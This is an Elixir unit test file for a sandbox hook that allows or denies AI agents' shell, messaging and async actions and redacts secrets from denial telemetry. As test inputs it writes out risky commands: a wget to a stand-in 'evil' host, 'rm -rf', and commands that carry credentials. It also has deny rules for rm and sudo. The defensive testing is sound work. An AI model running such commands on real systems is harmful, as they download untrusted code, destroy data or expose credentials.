defmodule Raxol.Agent.SandboxHookTest do
  use ExUnit.Case, async: true

  alias Raxol.Agent.Directive
  alias Raxol.Agent.Sandbox.{Async, SendAgent, Shell}
  alias Raxol.Agent.SandboxHook

  defmodule AllowAgent do
    def sandbox, do: []
  end

  defmodule ShellAllowlistAgent do
    def sandbox, do: [Shell.allowlist(["ls", "cat"])]
  end

  defmodule MixedAgent do
    def sandbox do
      [
        Shell.denylist(["rm"]),
        SendAgent.deny([:bad_actor]),
        Async.deny()
      ]
    end
  end

  defmodule PredicateAgent do
    def sandbox, do: [Shell.denylist(fn cmd -> String.contains?(cmd, "sudo") end)]
  end

  defmodule NoSandboxAgent do
    # No sandbox/0 callback defined.
  end

  defp ctx(agent_module) do
    %{agent_id: :test, agent_module: agent_module}
  end

  describe "pre_execute/2 with no sandbox" do
    test "passes Shell through" do
      shell = Directive.shell("ls -la")
      assert {:ok, ^shell} = SandboxHook.pre_execute(shell, ctx(AllowAgent))
    end

    test "passes SendAgent through" do
      sa = Directive.send_agent(:worker, :hello)
      assert {:ok, ^sa} = SandboxHook.pre_execute(sa, ctx(AllowAgent))
    end

    test "passes Async through" do
      async = Directive.async(fn _ -> :ok end)
      assert {:ok, ^async} = SandboxHook.pre_execute(async, ctx(AllowAgent))
    end

    test "passes Shell through when agent has no sandbox/0 callback" do
      shell = Directive.shell("anything")
      assert {:ok, ^shell} = SandboxHook.pre_execute(shell, ctx(NoSandboxAgent))
    end

    test "passes unknown directive types through unchanged" do
      assert {:ok, :something_else} =
               SandboxHook.pre_execute(:something_else, ctx(AllowAgent))
    end
  end

  describe "pre_execute/2 with Shell allowlist" do
    test "allows listed commands" do
      shell = Directive.shell("ls -la /tmp")

      assert {:ok, ^shell} =
               SandboxHook.pre_execute(shell, ctx(ShellAllowlistAgent))
    end

    test "denies non-listed commands" do
      shell = Directive.shell("wget evil.example.com")

      assert {:deny, {:shell_denied, _mode, "wget evil.example.com"}} =
               SandboxHook.pre_execute(shell, ctx(ShellAllowlistAgent))
    end

    test "abstains on SendAgent" do
      sa = Directive.send_agent(:worker, :hi)
      assert {:ok, ^sa} = SandboxHook.pre_execute(sa, ctx(ShellAllowlistAgent))
    end
  end

  describe "pre_execute/2 with multi-dimensional sandbox" do
    test "denies the offending dimension only" do
      assert {:deny, {:shell_denied, _, _}} =
               SandboxHook.pre_execute(
                 Directive.shell("rm -rf"),
                 ctx(MixedAgent)
               )

      assert {:deny, {:send_agent_denied, _, :bad_actor}} =
               SandboxHook.pre_execute(
                 Directive.send_agent(:bad_actor, :msg),
                 ctx(MixedAgent)
               )

      assert {:deny, :async_denied} =
               SandboxHook.pre_execute(
                 Directive.async(fn _ -> :ok end),
                 ctx(MixedAgent)
               )
    end

    test "allows good operations" do
      assert {:ok, _} =
               SandboxHook.pre_execute(Directive.shell("ls"), ctx(MixedAgent))

      assert {:ok, _} =
               SandboxHook.pre_execute(
                 Directive.send_agent(:good_actor, :msg),
                 ctx(MixedAgent)
               )
    end
  end

  describe "telemetry on deny" do
    setup do
      handler_id = "sandbox_hook_test_#{System.unique_integer([:positive])}"
      test_pid = self()

      :telemetry.attach(
        handler_id,
        [:raxol, :agent, :sandbox, :denied],
        fn event, _measurements, metadata, _ ->
          send(test_pid, {:tel, event, metadata})
        end,
        nil
      )

      on_exit(fn -> :telemetry.detach(handler_id) end)
      :ok
    end

    test "fires :denied with action + reason + agent context" do
      SandboxHook.pre_execute(Directive.shell("rm -rf"), ctx(MixedAgent))

      assert_receive {:tel, [:raxol, :agent, :sandbox, :denied],
                      %{
                        action: :shell,
                        reason: {:shell_denied, _, _},
                        agent_id: :test,
                        agent_module: MixedAgent
                      }}
    end

    test "the emitted reason names the program, never the arguments" do
      # A simple command: the first token is what `sh` would exec. The caller
      # still receives the whole line in `{:deny, reason}`; the wire carries
      # the program and a digest.
      command = "curl -H Authorization:Bearer-SECRET-TOKEN-7f3a https://x.test"

      assert {:deny, {:shell_denied, _, ^command}} =
               SandboxHook.pre_execute(Directive.shell(command), ctx(ShellAllowlistAgent))

      assert_receive {:tel, [:raxol, :agent, :sandbox, :denied], metadata}
      assert {:shell_denied, {:allowlist, ["ls", "cat"]}, "curl"} = metadata.reason
      assert metadata.command_digest =~ ~r/\A[0-9a-f]{16}\z/
      refute inspect(metadata) =~ "SECRET-TOKEN"
    end

    test "an env-assignment prefix is never emitted as the program" do
      # List modes deny every assignment-prefixed command, so this emit always
      # fires for exactly the shape a credential rides in. The first token IS
      # the secret; only a shape tag may leave the process.
      command = "PGPASSWORD=hunter2-SECRET psql -c 'select 1'"

      assert {:deny, {:shell_denied, _, ^command}} =
               SandboxHook.pre_execute(Directive.shell(command), ctx(MixedAgent))

      assert_receive {:tel, [:raxol, :agent, :sandbox, :denied], metadata}
      assert {:shell_denied, {:denylist, ["rm"]}, :non_simple} = metadata.reason
      assert metadata.command_digest =~ ~r/\A[0-9a-f]{16}\z/
      refute inspect(metadata) =~ "hunter2"
    end

    test "a simple command whose program token carries `=` is emitted as a tag" do
      command = "./deploy?token=SECRET-7f3a --now"

      assert {:deny, _} =
               SandboxHook.pre_execute(Directive.shell(command), ctx(ShellAllowlistAgent))

      assert_receive {:tel, [:raxol, :agent, :sandbox, :denied], metadata}
      assert {:shell_denied, _mode, :non_simple} = metadata.reason
      refute inspect(metadata) =~ "SECRET"
    end

    test "the program name is bounded in bytes, not graphemes" do
      # 40 two-byte graphemes: under a grapheme cap of 64, over the 64-byte
      # identifier bound `ThreadLogRouter` enforces on the persisted payload.
      program = String.duplicate("\u00e9", 40)
      assert byte_size(program) == 80

      assert {:deny, _} =
               SandboxHook.pre_execute(
                 Directive.shell(program <> " arg"),
                 ctx(ShellAllowlistAgent)
               )

      assert_receive {:tel, [:raxol, :agent, :sandbox, :denied], metadata}
      assert {:shell_denied, _mode, {:redacted, :binary, 80}} = metadata.reason
    end

    test "a predicate mode is redacted to its shape on the wire" do
      assert {:deny, _} =
               SandboxHook.pre_execute(Directive.shell("sudo ls"), ctx(PredicateAgent))

      assert_receive {:tel, [:raxol, :agent, :sandbox, :denied], metadata}
      assert {:shell_denied, {:denylist, {:redacted, :function}}, "sudo"} = metadata.reason
    end

    test "does not fire on allow" do
      SandboxHook.pre_execute(Directive.shell("ls"), ctx(MixedAgent))
      refute_received {:tel, [:raxol, :agent, :sandbox, :denied], _}
    end
  end
end
